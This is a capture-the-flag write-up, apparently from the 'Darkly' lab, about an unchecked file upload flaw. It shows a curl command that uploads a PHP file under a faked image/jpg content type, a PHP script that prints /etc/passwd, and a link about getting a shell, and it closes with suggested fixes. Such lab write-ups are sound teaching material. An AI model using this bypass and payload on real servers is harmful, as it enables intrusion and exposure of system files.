# Unchecked File Upload

## Vulnerability

In the middle of the page, there is a link `ADD IMAGE` redirecting to: [`index.php?page=upload`](http://darkly/index.php?page=upload).

Uploading a PNG file, give an error:
```
Your image was not uploaded.
```
Uploading a JPG file, give a result: 
```
/tmp/file.jpg succesfully uploaded.
```

The file content itself isn't checked. Only the file name.

Uploading a file with a name not containing `jpg` BUT still having the `jpg` content-type give the flag.
```bash
$ curl \
    -F 'Upload=Upload' \
    -F "uploaded=@exploit.php;type=image/jpg" \
    -F 'MAX_FILE_SIZE=100000' \
    'http://darkly/?page=upload'
...
<h2>The flag is : ...</h2>
...
```

## Why it is dangerous

If the user can upload an executable file on the server, they can execute it just by browsing to its url if it is exposed to the internet.

In this case, they can do:
* everything PHP as a language can do
* that is permitted to the user executing the PHP binary.

**Example 1:** if `/etc/passwd` is `-rw-r--r--`, the following script can print it to the screen:
```php
<?php
$fh = fopen('/etc/passwd','r');
while ($line = fgets($fh)) {
  echo($line);
}
fclose($fh);
?>
```

**Example 2:** one can [get a shell](https://gtfobins.github.io/gtfobins/php/) through this script.

## Possible Fix

- Check the file magic.
- Restrict the permissions the users executing `php` has.
